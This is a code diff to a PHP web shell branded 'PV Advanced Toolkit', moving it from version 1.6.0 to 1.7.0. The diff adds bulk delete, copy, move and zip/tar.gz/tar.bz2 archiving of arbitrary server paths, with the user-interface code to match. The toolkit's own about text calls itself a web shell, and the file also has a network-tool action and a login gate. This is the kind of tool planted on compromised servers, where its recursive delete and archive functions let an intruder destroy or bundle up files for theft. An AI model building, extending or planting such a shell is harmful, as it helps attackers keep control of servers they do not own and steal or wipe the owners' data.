@@ -1638,6 +1638,170 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 $response['message'] = '[Error] Missing path or date/time string for touch operation.';
             }
             break;
+        
+        case 'bulk_action':
+            $operation = isset($_POST['bulk_operation']) ? $_POST['bulk_operation'] : '';
+            $items_json = isset($_POST['selected_items']) ? $_POST['selected_items'] : '[]';
+            $items = json_decode($items_json, true);
+
+            if (empty($operation) || empty($items) || !is_array($items)) {
+                $response['message'] = '[Error] Invalid bulk action request. No operation or items selected.';
+                break;
+            }
+
+            $errors = array();
+            $success_count = 0;
+
+            switch ($operation) {
+                case 'delete':
+                    function delete_recursive($path) {
+                        if (!file_exists($path)) return true;
+                        if (is_file($path) || is_link($path)) return @unlink($path);
+                        if (!is_dir($path)) return false;
+                        $dir_items = new RecursiveIteratorIterator(
+                            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
+                            RecursiveIteratorIterator::CHILD_FIRST
+                        );
+                        foreach ($dir_items as $item) {
+                            if ($item->isDir()) @rmdir($item->getRealPath());
+                            else @unlink($item->getRealPath());
+                        }
+                        return @rmdir($path);
+                    }
+                    foreach ($items as $item_path) {
+                        if (delete_recursive($item_path)) {
+                            $success_count++;
+                        } else {
+                            $errors[] = "Failed to delete " . htmlspecialchars(basename($item_path));
+                        }
+                    }
+                    $response['message'] = "Deleted {$success_count} item(s).";
+                    if (!empty($errors)) $response['message'] .= " Errors: " . implode(', ', $errors);
+                    $response['status'] = empty($errors) ? 'success' : 'error';
+                    break;
+
+                case 'copy':
+                case 'move':
+                    $destination_path = isset($_POST['destination_path']) ? $_POST['destination_path'] : '';
+                    if (empty($destination_path) || !is_dir($destination_path) || !is_writable($destination_path)) {
+                        $response['message'] = '[Error] Invalid or non-writable destination directory.';
+                        break;
+                    }
+                    function copy_recursive($source, $dest) {
+                        if (is_dir($source)) {
+                            if (!is_dir($dest)) @mkdir($dest, 0755, true);
+                            $dir_items = new DirectoryIterator($source);
+                            foreach ($dir_items as $item) {
+                                if ($item->isDot()) continue;
+                                if (!copy_recursive($item->getPathname(), $dest . DIRECTORY_SEPARATOR . $item->getFilename())) {
+                                    return false;
+                                }
+                            }
+                            return true;
+                        } elseif (is_file($source)) {
+                            return @copy($source, $dest);
+                        }
+                        return false;
+                    }
+
+                    foreach ($items as $item_path) {
+                        $dest_item_path = $destination_path . DIRECTORY_SEPARATOR . basename($item_path);
+                        $op_success = false;
+                        if ($operation === 'move') {
+                            $op_success = @rename($item_path, $dest_item_path);
+                        } else { // copy
+                            $op_success = copy_recursive($item_path, $dest_item_path);
+                        }
+                        if ($op_success) {
+                            $success_count++;
+                        } else {
+                            $errors[] = "Failed to " . $operation . " " . htmlspecialchars(basename($item_path));
+                        }
+                    }
+                    $action_past_tense = ($operation === 'move') ? 'Moved' : 'Copied';
+                    $response['message'] = "{$action_past_tense} {$success_count} item(s) to " . htmlspecialchars($destination_path) . ".";
+                    if (!empty($errors)) $response['message'] .= " Errors: " . implode(', ', $errors);
+                    $response['status'] = empty($errors) ? 'success' : 'error';
+                    break;
+                
+                case 'zip':
+                case 'tar.gz':
+                case 'tar.bz2':
+                    $archive_filename = isset($_POST['archive_filename']) ? $_POST['archive_filename'] : '';
+                    if (empty($archive_filename)) {
+                        $response['message'] = '[Error] Archive filename cannot be empty.';
+                        break;
+                    }
+                    $archive_path = $current_ajax_cwd . DIRECTORY_SEPARATOR . $archive_filename;
+                    if (file_exists($archive_path)) {
+                        $response['message'] = '[Error] Archive file already exists: ' . htmlspecialchars($archive_filename);
+                        break;
+                    }
+                    
+                    try {
+                        if ($operation === 'zip') {
+                            if (!class_exists('ZipArchive')) throw new Exception("ZipArchive class not available.");
+                            $zip = new ZipArchive();
+                            if ($zip->open($archive_path, ZipArchive::CREATE) !== TRUE) throw new Exception("Cannot create ZIP archive.");
+                            
+                            function add_to_zip($path, &$zip, $base_path) {
+                                $local_path = str_replace($base_path . DIRECTORY_SEPARATOR, '', $path);
+                                if (is_dir($path)) {
+                                    $zip->addEmptyDir($local_path);
+                                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+                                    foreach ($files as $file) {
+                                        $file_path = $file->getRealPath();
+                                        $local_file_path = str_replace($base_path . DIRECTORY_SEPARATOR, '', $file_path);
+                                        if ($file->isDir()) {
+                                            $zip->addEmptyDir($local_file_path);
+                                        } else if ($file->isFile()) {
+                                            $zip->addFile($file_path, $local_file_path);
+                                        }
+                                    }
+                                } else if (is_file($path)) {
+                                    $zip->addFile($path, basename($path));
+                                }
+                            }
+                            
+                            foreach ($items as $item_path) {
+                                add_to_zip($item_path, $zip, dirname($item_path));
+                            }
+                            $zip->close();
+                        } else { // tar.gz or tar.bz2
+                            if (!class_exists('PharData')) throw new Exception("PharData class not available.");
+                            $tar_filename = ($operation === 'tar.gz') ? str_replace('.tar.gz', '.tar', $archive_filename) : str_replace('.tar.bz2', '.tar', $archive_filename);
+                            $tar_path = $current_ajax_cwd . DIRECTORY_SEPARATOR . $tar_filename;
+                            
+                            $phar = new PharData($tar_path);
+                            
+                            function add_to_tar($path, &$phar, $base_path) {
+                                if (is_dir($path)) {
+                                    $phar->buildFromDirectory($path);
+                                } else if (is_file($path)) {
+                                    $phar->addFile($path, basename($path));
+                                }
+                            }
+                            foreach ($items as $item_path) {
+                                add_to_tar($item_path, $phar, dirname($item_path));
+                            }
+                            
+                            if ($operation === 'tar.gz') {
+                                $phar->compress(Phar::GZ);
+                            } else { // tar.bz2
+                                $phar->compress(Phar::BZ2);
+                            }
+                            @unlink($tar_path); // remove intermediate .tar
+                        }
+                        
+                        $response['status'] = 'success';
+                        $response['message'] = "Successfully created archive: " . htmlspecialchars($archive_filename);
+                    } catch (Exception $e) {
+                        $response['message'] = '[Error] ' . $e->getMessage();
+                        if (file_exists($archive_path)) @unlink($archive_path);
+                    }
+                    break;
+            }
+            break;
 
         case 'network_tool':
             $sub_action = isset($_POST['sub_action']) ? $_POST['sub_action'] : 'none';
@@ -1813,7 +1977,7 @@ endif;
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Toolkit v1.6.0</title>
+    <title>Advanced Toolkit v1.7.0</title>
     <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg==">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -1849,12 +2013,14 @@ endif;
         .file-table th { background: #033; color: #0ff; }
         .file-table tr:nth-child(even) { background: #010101; }
         .file-table tbody tr:hover { background-color: #025 !important; }
-        .file-table th:nth-child(2), .file-table td:nth-child(2) { text-align: center; padding-left: 4px; padding-right: 4px; }
-        .file-table th:nth-child(3), .file-table td:nth-child(3) { white-space: nowrap; padding-right: 4px; }
-        .file-table th:nth-child(4), .file-table td:nth-child(4) { text-align: center; white-space: nowrap; padding-left: 4px; padding-right: 4px; }
-        .file-table th:nth-child(5), .file-table td:nth-child(5) { text-align: center; padding-left: 4px; padding-right: 4px; }
-        .file-table th:nth-child(6), .file-table td:nth-child(6) { white-space: nowrap; padding-right: 4px; }
-        .file-table th:nth-child(7), .file-table td:nth-child(7) { text-align: center; white-space: nowrap; padding-left: 4px; padding-right: 4px; }
+        .file-table .col-actions-th { width: 40px; text-align: center; }
+        .file-table .col-actions-td { text-align: center; }
+        .file-table th:nth-child(3), .file-table td:nth-child(3) { text-align: center; padding-left: 4px; padding-right: 4px; }
+        .file-table th:nth-child(4), .file-table td:nth-child(4) { white-space: nowrap; padding-right: 4px; }
+        .file-table th:nth-child(5), .file-table td:nth-child(5) { text-align: center; white-space: nowrap; padding-left: 4px; padding-right: 4px; }
+        .file-table th:nth-child(6), .file-table td:nth-child(6) { text-align: center; padding-left: 4px; padding-right: 4px; }
+        .file-table th:nth-child(7), .file-table td:nth-child(7) { white-space: nowrap; padding-right: 4px; }
+        .file-table th:nth-child(8), .file-table td:nth-child(8) { text-align: center; white-space: nowrap; padding-left: 4px; padding-right: 4px; }
         .file-table td a { color: #0ff; text-decoration: none; }
         .file-table td a:hover { text-decoration: underline; color: #0aa; }
         .file-table .action-btn { background-color: transparent; color: #0ff; border: none; padding: 3px 4px; margin: 0 2px; cursor: pointer; border-radius: 3px; font-size:1.1em; text-decoration: none; display: inline-block; vertical-align: middle;}
@@ -1910,17 +2076,18 @@ endif;
         .uncompressor-sub-content { display: none; } .uncompressor-sub-content.active { display: block; }
         #uncompressor-results { background: #000; color: #fff; padding: 15px; min-height: 100px; max-height: 300px; overflow-y: scroll; border: 1px solid #055; margin-top: 20px; white-space: pre-wrap; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9em; border-radius: 5px; }
         #uncompressor-results:empty::before { content: "Extraction results will appear here..."; color: #555; }
-        #uncompressor-results .success { color: #0f0; } #uncompressor-results .error { color: #f00; }
         #uncompressor-form .input-group { margin-bottom: 15px; }
         #uncompressor-form label { display: block; margin-bottom: 5px; color: #0cc; }
         #uncompressor-form .inputz { width: 100%; box-sizing: border-box; }
         #uncompressor-form small { font-size: 0.8em; color: #888; display: block; margin-top: 5px; }
+        #bulk-actions-container { display: flex; gap: 10px; align-items: center; margin-left: 20px; }
+        #bulk-action-inputs { display: flex; gap: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>💀 PV Advanced Toolkit v1.6.0</h1>
+            <h1>💀 PV Advanced Toolkit v1.7.0</h1>
             <form method="post" class="logout-form">
                 <input type="hidden" name="action" value="logout">
                 <button type="submit">Logout</button>
@@ -1960,10 +2127,28 @@ endif;
                  <button id="file-upload-btn" class="inputzbut">Upload File(s)</button>
                  <button id="create-file-btn" class="inputzbut">New File</button>
                  <button id="create-folder-btn" class="inputzbut">New Folder</button>
+                 <div id="bulk-actions-container" class="hidden">
+                    <select id="bulk-action-select" class="inputz">
+                        <option value="">-- Bulk Actions --</option>
+                        <option value="delete">Delete</option>
+                        <option value="copy">Copy</option>
+                        <option value="move">Move</option>
+                        <option value="zip">Zip</option>
+                        <?php if (class_exists('PharData')): ?>
+                        <option value="tar.gz">Compress (tar.gz)</option>
+                        <option value="tar.bz2">Compress (tar.bz2)</option>
+                        <?php endif; ?>
+                    </select>
+                    <div id="bulk-action-inputs">
+                        <input type="text" id="bulk-destination-path" class="inputz hidden" placeholder="Destination Path">
+                        <input type="text" id="bulk-archive-name" class="inputz hidden" placeholder="archive.zip">
+                    </div>
+                    <button id="bulk-action-go-btn" class="inputzbut">Go</button>
+                 </div>
             </div>
             <table class="file-table">
-                <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Owner/Group</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
-                <tbody id="file-listing"><tr><td colspan="7" style="text-align:center;">Loading...</td></tr></tbody>
+                <thead><tr><th class="col-actions-th"><input type="checkbox" id="select-all-checkbox"></th><th>Name</th><th>Type</th><th>Size</th><th>Owner/Group</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
+                <tbody id="file-listing"><tr><td colspan="8" style="text-align:center;">Loading...</td></tr></tbody>
             </table>
         </div>
 
@@ -2089,7 +2274,7 @@ endif;
                     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Toolkit GIF" style="width: 200px; height: 200px; margin-right: 20px; border-radius: 5px; flex-shrink: 0;">
                     <div style="flex-grow: 1;">
                         <h2>About PV Advanced Toolkit</h2>
-                        <p><strong>Version:</strong> 1.6.0</p>
+                        <p><strong>Version:</strong> 1.7.0</p>
                         <p>This toolkit is a comprehensive PHP-based web shell and server management interface, designed for server administrators and security professionals for system inspection, management, and basic network operations.</p>
                     </div>
                 </div>
@@ -2109,6 +2294,7 @@ endif;
                     </li>
                     <li><strong>Advanced File Manager:</strong>
                         <ul>
+                            <li><strong>NEW: Bulk Actions:</strong> Select multiple files/folders to Delete, Copy, Move, or Compress (Zip, Tar.gz, Tar.bz2) them at once.</li>
                             <li><strong>NEW: Large File Uploads & Progress Bar:</strong> Upload files of any size (1GB+) with real-time progress bars for each file, using a chunked upload method.</li>
                             <li><strong>Navigation:</strong> Navigate directories with clickable breadcrumbs, an editable path bar, and drive detection (Windows).</li>
                             <li>Browse server directories and view file/folder details (name, type, size, permissions, last modified).</li>
@@ -2187,6 +2373,15 @@ document.addEventListener('DOMContentLoaded', function() {
     const uncompressorSubContents = document.querySelectorAll('.uncompressor-sub-content');
     const uncompressorFileInput = document.getElementById('uncompressor-file-input');
     const uncompressorLocalPathInput = document.getElementById('uncompressor-local-path');
+
+    // Bulk action elements
+    const bulkActionsContainer = document.getElementById('bulk-actions-container');
+    const selectAllCheckbox = document.getElementById('select-all-checkbox');
+    const bulkActionSelect = document.getElementById('bulk-action-select');
+    const bulkActionInputs = document.getElementById('bulk-action-inputs');
+    const bulkDestinationPath = document.getElementById('bulk-destination-path');
+    const bulkArchiveName = document.getElementById('bulk-archive-name');
+    const bulkActionGoBtn = document.getElementById('bulk-action-go-btn');
 
     const scriptHomeDirectory = '<?php echo addslashes(htmlspecialchars(getcwd())); ?>';
     const initialFileManagerPath = '<?php echo addslashes(htmlspecialchars($fileManagerInitialPath)); ?>';
@@ -2428,8 +2623,10 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     async function fetchFiles(path) {
-        fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center;">Loading files for ${htmlEntities(path)}...</td></tr>`;
+        fileListingBody.innerHTML = `<tr><td colspan="8" style="text-align:center;">Loading files for ${htmlEntities(path)}...</td></tr>`;
         const result = await sendAjaxRequest('get_file_listing', { path: path });
+        
+        updateBulkActionsVisibility();
 
         driveListContainer.innerHTML = ''; breadcrumbContainer.innerHTML = '';
         if (result.path) pathInput.value = result.path;
@@ -2460,7 +2657,7 @@ document.addEventListener('DOMContentLoaded', function() {
         fileListingBody.innerHTML = '';
         if (result.status === 'success') {
             if (!result.files || result.files.length === 0) {
-                fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center;">Directory is empty.</td></tr>`;
+                fileListingBody.innerHTML = `<tr><td colspan="8" style="text-align:center;">Directory is empty.</td></tr>`;
                 return;
             }
             result.files.forEach(file => {
@@ -2469,6 +2666,12 @@ document.addEventListener('DOMContentLoaded', function() {
                 const escFullPath = htmlEntities(fullItemPath);
                 const escFileName = htmlEntities(file.name);
                 
+                let actionCheckboxCell = `<td class="col-actions-td">`;
+                if(file.name !== '..') {
+                   actionCheckboxCell += `<input type="checkbox" class="file-checkbox" data-path="${escFullPath}">`;
+                }
+                actionCheckboxCell += `</td>`;
+
                 let nameCell = `<td><i class="${file.icon_class}" style="color:${file.icon_color};"></i> `;
                 if (file.type === 'dir') {
                     nameCell += `<a href="#" class="dir-link" data-path="${escFullPath}" style="color:${file.icon_color};">${escFileName}</a></td>`;
@@ -2489,18 +2692,24 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
                 actionsCell += '</td>';
 
-                row.innerHTML = `${nameCell}<td>${file.type}</td><td>${file.size}</td><td>${file.owner}</td><td><span style="color:${file.perm_color}; font-weight:bold;">${file.perms}</span></td><td>${file.modified}</td>${actionsCell}`;
+                row.innerHTML = `${actionCheckboxCell}${nameCell}<td>${file.type}</td><td>${file.size}</td><td>${file.owner}</td><td><span style="color:${file.perm_color}; font-weight:bold;">${file.perms}</span></td><td>${file.modified}</td>${actionsCell}`;
             });
         } else {
-            fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:red;">${htmlEntities(result.message)}</td></tr>`;
+            fileListingBody.innerHTML = `<tr><td colspan="8" style="text-align:center; color:red;">${htmlEntities(result.message)}</td></tr>`;
         }
     }
 
     fileListingBody.addEventListener('click', e => {
-        const target = e.target.closest('a, button');
-        if (!target) return;
+        const target = e.target;
+        if (target.classList.contains('file-checkbox')) {
+            updateBulkActionsVisibility();
+            return;
+        }
 
-        const isDownloadLink = target.tagName === 'A' && target.title === 'Download';
+        const actionTarget = e.target.closest('a, button');
+        if (!actionTarget) return;
+
+        const isDownloadLink = actionTarget.tagName === 'A' && actionTarget.title === 'Download';
 
         if (isDownloadLink) {
             return; 
@@ -2508,13 +2717,13 @@ document.addEventListener('DOMContentLoaded', function() {
         
         e.preventDefault();
 
-        const ds = target.dataset;
-        if (target.classList.contains('dir-link')) fetchFiles(ds.path);
-        else if (target.classList.contains('file-link') || target.classList.contains('view-btn')) openModalWithFile(ds.path, ds.name);
-        else if (target.classList.contains('rename-btn')) renameItem(ds.path, ds.name);
-        else if (target.classList.contains('chmod-btn')) chmodItem(ds.path, ds.perms, ds.name);
-        else if (target.classList.contains('touch-btn')) touchItem(ds.path, ds.name);
-        else if (target.classList.contains('delete-btn')) deleteItem(ds.path, ds.name, ds.type);
+        const ds = actionTarget.dataset;
+        if (actionTarget.classList.contains('dir-link')) fetchFiles(ds.path);
+        else if (actionTarget.classList.contains('file-link') || actionTarget.classList.contains('view-btn')) openModalWithFile(ds.path, ds.name);
+        else if (actionTarget.classList.contains('rename-btn')) renameItem(ds.path, ds.name);
+        else if (actionTarget.classList.contains('chmod-btn')) chmodItem(ds.path, ds.perms, ds.name);
+        else if (actionTarget.classList.contains('touch-btn')) touchItem(ds.path, ds.name);
+        else if (actionTarget.classList.contains('delete-btn')) deleteItem(ds.path, ds.name, ds.type);
     });
 
     function navigateToInputPath() {
@@ -2798,6 +3007,92 @@ document.addEventListener('DOMContentLoaded', function() {
             if (dest === '.' || dest === '') {
                  fetchFiles(currentFileManagerPath);
             }
+        }
+    });
+
+    // --- BULK ACTIONS LOGIC ---
+    function updateBulkActionsVisibility() {
+        const checkedBoxes = document.querySelectorAll('.file-checkbox:checked');
+        if (checkedBoxes.length > 0) {
+            bulkActionsContainer.classList.remove('hidden');
+        } else {
+            bulkActionsContainer.classList.add('hidden');
+            selectAllCheckbox.checked = false;
+        }
+    }
+
+    selectAllCheckbox.addEventListener('change', function() {
+        const checkboxes = document.querySelectorAll('.file-checkbox');
+        checkboxes.forEach(checkbox => {
+            checkbox.checked = this.checked;
+        });
+        updateBulkActionsVisibility();
+    });
+
+    bulkActionSelect.addEventListener('change', function() {
+        const selectedAction = this.value;
+        bulkDestinationPath.classList.add('hidden');
+        bulkArchiveName.classList.add('hidden');
+
+        if (selectedAction === 'copy' || selectedAction === 'move') {
+            bulkDestinationPath.classList.remove('hidden');
+            bulkDestinationPath.placeholder = 'Destination Path';
+            bulkDestinationPath.value = currentFileManagerPath;
+        } else if (selectedAction === 'zip' || selectedAction === 'tar.gz' || selectedAction === 'tar.bz2') {
+            bulkArchiveName.classList.remove('hidden');
+            let ext = selectedAction;
+            bulkArchiveName.placeholder = `archive.${ext}`;
+            bulkArchiveName.value = `archive.${ext}`;
+        }
+    });
+
+    bulkActionGoBtn.addEventListener('click', async function() {
+        const operation = bulkActionSelect.value;
+        const selectedItems = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.dataset.path);
+
+        if (!operation) {
+            showCustomAlert('Please select a bulk action.', 'error');
+            return;
+        }
+        if (selectedItems.length === 0) {
+            showCustomAlert('Please select at least one item.', 'error');
+            return;
+        }
+
+        let data = {
+            bulk_operation: operation,
+            selected_items: JSON.stringify(selectedItems)
+        };
+
+        if (operation === 'copy' || operation === 'move') {
+            const destPath = bulkDestinationPath.value.trim();
+            if (!destPath) {
+                showCustomAlert('Destination path cannot be empty.', 'error');
+                return;
+            }
+            data.destination_path = destPath;
+        } else if (operation.startsWith('zip') || operation.startsWith('tar')) {
+            const archiveName = bulkArchiveName.value.trim();
+            if (!archiveName) {
+                showCustomAlert('Archive filename cannot be empty.', 'error');
+                return;
+            }
+            data.archive_filename = archiveName;
+        }
+        
+        if (operation === 'delete') {
+            if (!confirm(`Are you sure you want to delete ${selectedItems.length} selected item(s)? This cannot be undone.`)) {
+                return;
+            }
+        }
+
+        this.disabled = true;
+        const result = await sendAjaxRequest('bulk_action', data);
+        this.disabled = false;
+        
+        showCustomAlert(result.message, result.status);
+        if (result.status === 'success') {
+            fetchFiles(currentFileManagerPath);
         }
     });
 
